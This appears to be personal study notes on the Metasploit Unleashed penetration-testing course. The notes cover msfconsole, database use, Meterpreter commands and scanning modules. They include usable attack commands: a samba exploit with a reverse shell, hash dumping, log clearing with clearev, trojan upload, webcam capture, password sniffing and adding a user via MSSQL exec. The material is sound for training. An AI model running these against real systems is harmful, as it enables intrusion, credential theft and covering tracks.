# metasploit-unleashed  
### offensive security explanation of metasploit  
#### assuming you have all the requirements to get going 

### What is the msfcli?
The msfcli provides a powerful command line interface to the framework. This allows you to easily add Metasploit exploits into any scripts you may create.  
```
root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```
### running the cli
`msfcli -h`  
Usage: /usr/bin/msfcli  >option=value> [mode]  
*Note: when using msfcli, variables are assigned using the “equal to” operator = and that all options are case-sensitive.*  
 **for help** or your not sure what to do next append the letter ‘O‘.  
`msfcli exploit/multi/samba/usermap_script O` 

To display available payloads append the letter ‘P‘.
`msfcli exploit/multi/samba/usermap_script P`  

```
The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.
```

## Msfconsole Commands
[msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)  
too many to list all of them here

## Using Metasploit DB 
1. `service postgresql start`  
2. `msfdb init`  
3. `msfconsole`  
4. `msf > db_status`  
5. `msf > workspace`  -h  
6. `msf > workspace -a lab1`  adds new  
7. `msf help`  
8. `msf > db_import /root/file-to-scan/  
9. `msf > hosts`  
10. `msf > db_nmap -A ip-address-to-scan  
11. `msf > db_export -h`  help exporting data  
12. `msf > hosts -h`  
13. `msf > hosts -c address,os_flavor`  or append -S Linux  
14. `msf > use auxiliary/scanner/portscan/tcp`  
15. `msf auxiliary(tcp) > show options`  
16. `msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R`  
17. `msf  auxiliary(tcp) > hosts -R`   
18. `msf > services -h`  
19. `msf > services -c name,info 172.16.194.134`  append -S http  
20. `msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv`  export to .CSV  
21. `msf > creds`  stores any credentials saved along the way.  
22. `msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::`  ex.
23. `msf > loot -h`  
24. `msf  exploit(usermap_script) > exploit`  how one would populate the db with some 'loot'  

## Meterpreter  is the shell you get back on a victims computer.  Its a live session.    
### basic commands  
1. `meterpreter > help`  
2. `meterpreter > background`  sends session to background and u back to msf cmd prompt  
```
msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```
3. `cat`  same as always.  
4. `cd` and `pwd`   navigate victims computer  
```
meterpreter > pwd
c:\
meterpreter > cd c:\windows
meterpreter > pwd
c:\windows
meterpreter >
```  
5. `clearev`  clears the Application, System and Security logs on a Window systems.  
6. `download`   downloads a file from the remote machine  
```
meterpreter > download c:\\boot.ini
[*] downloading: c:\boot.ini -> c:\boot.ini
[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
meterpreter >
```
7. `edit`  opens a file located on the target host. ex `meterpreter > edit edit.txt`  
8. `execute`  runs a command on the target  `meterpreter > execute -f cmd.exe -i -H`  
9. `getuid`  displays user that the meterpreter is using on host  
10. `hashdump`  post module will dump the contents of the SAM database `meterpreter > run post/windows/gather/hashdump`  
11. `idletime`  display the number of seconds that the user at the remote machine has been idle.  
12. `ipconfig` displays the network interfaces and addresses on the remote machine.  
13. `lpwd` and `lcd`  used to display and change the local working directory respectively  `lpwd` is where you are on your machine `lcd` is how you move around the file system  
14. `ls` lists all files in current dir on victim machine.  
15. `migrate` you can migrate to another process on the victim `meterpreter > run post/windows/manage/migrate`  
16. `ps` displays a list of running processes on the target.  
17.  `resource`  executes meterpreter instructions located inside a text file `resource readfile.txt`  
18. `search`  provides a way of finding files on victim computer. `search -f autoexec.bat`  
19. `shell`  will give you a standard shell on victim computer  
20. `upload`  make note of double-slashes `meterpreter > upload evil_trojan.exe c:\\windows\\system32`  
21. `webcam_list` display currently available web cams on vc  
22. `webcam_snap`  grabs a picture from a connected web cam `meterpreter > webcam_snap -i 1 -v false`  

### Python Extension  
`meterpreter > load python`  - `help`  
##### some python examples  
`meterpreter > python_execute "print 'Good morning! It\\'s 5am'"`  
You can also save to a variable, and print its content using the “-r” switch.  
```
meterpreter > python_execute "import os; cd = os.getcwd()" -r cd
[+] cd = C:\Users\loneferret\Downloads
meterpreter >
```
```
root@kali:~# cat findfiles.py 
import os
for root, dirs, files in os.walk("c://"):
    for file in files:
        if file.endswith(".txt") and file.startswith("readme"):
             print(os.path.join(root, file))
```
`meterpreter > python_import -f /root/findfiles.py`  
___
## Information gathering  
* port scanning  
* hunting for MSSQL  
* service identification  
* password sniffing  
* snmp sweeping  

___

### Port Scanning  
* preparing metaploit for port scanning  
* Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST.  
* scanner modules will have the THREADS value set to ‘1’. 
    - Keep the THREADS value under 16 on native Win32 systems  
    - Keep THREADS under 200 when running MSF under Cygwin  
    - On Unix-like operating systems, THREADS can be set to 256.  

#### Contents 
* Nmap & db_nmap
* Port Scanning
* SMB Version Scanning
* Idle Scanning

##### nmap and db_nmap  
`msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1`  this will generate 3 files that can be loaded into db later.  
`db_nmap -v -sV 192.168.1.0/24`  this will poplulate the db right straight away.  

##### port scanning
`use auxiliary/scanner/`  search all possibilities.   
`search portscan`  checks the port scanning modules  
`msf > cat subnet_1.gnmap | grep 80/open | awk '{print $2}'`  checks to see what ports have 80 open from our scan.  

switch to use a new scanner  
`msf > use auxiliary/scanner/portscan/syn`  
`msf auxiliary(syn) > show options`  gives options available  
set options  
```
msf auxiliary(syn) > set INTERFACE eth0
INTERFACE => eth0
msf auxiliary(syn) > set PORTS 80
PORTS => 80
msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(syn) > set THREADS 50
THREADS => 50
msf auxiliary(syn) > run
```  
switch to new scanner   
`msf > use auxiliary/scanner/portscan/tcp`  
`msf  auxiliary(tcp) > show options`  
`msf  auxiliary(tcp) > hosts -R`   we can issue the ‘hosts -R’ command to automatically set this option with the hosts found in our database.  
`msf  auxiliary(tcp) > run`  

##### SMB Version Scanning
Now that we have determined which hosts are available on the network, we can attempt to determine which operating systems they are running. This will help us narrow down our attacks to target a specific system and will stop us from wasting time on those that aren’t vulnerable to a particular exploit.  

`msf > use auxiliary/scanner/smb/smb_version`  
```
msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
RHOSTS => 192.168.1.200-210
msf auxiliary(smb_version) > set THREADS 11
THREADS => 11
msf auxiliary(smb_version) > run
```
`msf auxiliary(smb_version) > hosts`  now newly acquired information is stored in db.  

##### Idle Scanning  
Nmap’s IPID Idle scanning allows us to be a little stealthy scanning a target while spoofing the IP address of another host on the network. In order for this type of scan to work, we will need to locate a host that is idle on the network and uses IPID sequences of either Incremental or Broken Little-Endian Incremental. Metasploit contains the module ‘scanner/ip/ipidseq’ to scan and look for a host that fits the requirements.[more info](https://nmap.org/book/idlescan.html)  
`msf > use auxiliary/scanner/ip/ipidseq`  
`msf auxiliary(ipidseq) > show options`  
```
msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(ipidseq) > set THREADS 50
THREADS => 50
msf auxiliary(ipidseq) > run
```
`msf auxiliary(ipidseq) > nmap -PN -sI 192.168.1.109 192.168.1.114`  

### Hunting for MSSQL  
[here](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
Searching for and locating MSSQL installations inside the internal network can be achieved using UDP foot-printing.  
`search mssql`  
`use auxiliary/scanner/mssql/mssql_ping`  
`show options`  
`set RHOSTS 10.22.55.1/24`  
`exploit`  
**brute force**  
`use auxiliary/admin/mssql/mssql_exec`  
`show options`  
`set RHOST 10.211.55.128`  
`set MSSQL_PASS password`  
`set CMD net user bacon ihazpassword /ADD`  
`exploit`  

### Service Identification  
[here](https://www.offensive-security.com/metasploit-unleashed/service-identification/)
Again, other than using Nmap to perform scanning for services on our target network, Metasploit also includes a large variety of scanners for various services, often helping you determine potentially vulnerable running services on target machines.  
#### SSH Service  
`services -p 22 -c name,port,proto`  
`use auxiliary/scanner/ssh/ssh_version`  
`set RHOSTS 172.16.194.163 172.16.194.172`  
`show options`  
`run`  
#### FTP Service  
Poorly configured FTP servers can frequently be the foothold you need in order to gain access to an entire network so it always pays off to check to see if anonymous access is allowed whenever you encounter an open FTP port which is usually on TCP port 21.  
`services -p 21 -c name,proto`  
`use auxiliary/scanner/ftp/ftp_version`  
`set RHOST 172.16.194.172`  
`show options` 

### Password Sniffing  
[here](https://www.offensive-security.com/metasploit-unleashed/password-sniffing/)
Using the psnuffle module is extremely simple. There are some options available but the module works great “out of the box”.  
**Module Location**  
 data/exploits/psnuffle  

`use auxiliary/sniffer/psnuffle`  
`show options`  
`run`  

### SNMP Sweeping  
[here](https://www.offensive-security.com/metasploit-unleashed/snmp-scan/)  
SNMP sweeps are often a good indicator in finding a ton of information about a specific system or actually compromising the remote device.  
#### SNMP 
Simple Network Management Protocol (SNMP) is an Internet-standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.  
`cd /etc/default/snmpd`  
change  
`SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'`  
to  
`SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'`  

#### MIB Management Information Base  
This interface allows you to query the device and extract information. Metasploit comes loaded with a list of default MIBs that it has in its database, it uses them to query the device for more information depending on what level of access is obtained. Let’s take a peek at the auxiliary module.  
`search snmp`  
`use auxiliary/scanner/snmp/snmp_login`  
`show options`  
`set RHOST 192.168.0.0-192.168.5.255`  
`set THREADS 10`  
`run`  

### Writing Your Own Security Scanner  
[here](https://www.offensive-security.com/metasploit-unleashed/writing-scanner/)  

### Windows Patch Enumeration  
[here](https://www.offensive-security.com/metasploit-unleashed/patch-enumeration/)
When confronted with  a Windows target, identifying which patches have been applied is an easy way of knowing if regular updates happen. It may also provide information on other possible vulnerabilities present on the system.  
```
msf exploit(handler) > use post/windows/gather/enum_patches
msf post(enum_patches) > show options
```

## Vulnerability Scanning  

### SMB Login Check
A common situation to find yourself in is being in possession of a valid username and password combination, and wondering where else you can use it.  
[docs](https://www.offensive-security.com/metasploit-unleashed/smb-login-check/)
### VNC Authentication 
The VNC Authentication None Scanner is an Auxiliary Module for Metasploit. This tool will search a range of IP addresses looking for targets that are running a VNC Server without a password configured.  
[docs](https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/)
### WMAP Web Scanner
WMAP is a feature-rich web application vulnerability scanner that was originally created from a tool named SQLMap. This tool is integrated with Metasploit and allows us to conduct web application scanning from within the Metasploit Framework.  
`load wmap`  
`msf > help`  
`wmap_sites -h`  
`wmap_sites -a http://172.16.194.172`  
`wmap_sites -l`  
`wmap_targets -h`  
`wmap_targets -t http://172.16.194.172/mutillidae/index.php`  
`wmap_targets -l`  
`wmap_run -h`  
`wmap_run -t`  
`wmap_run -e`  
`wmap_vulns -l`  
`vulns`  

## NeXpose
[docs](https://www.offensive-security.com/metasploit-unleashed/nexpose-msfconsole/)

## Nessus
[docs](https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/)


 
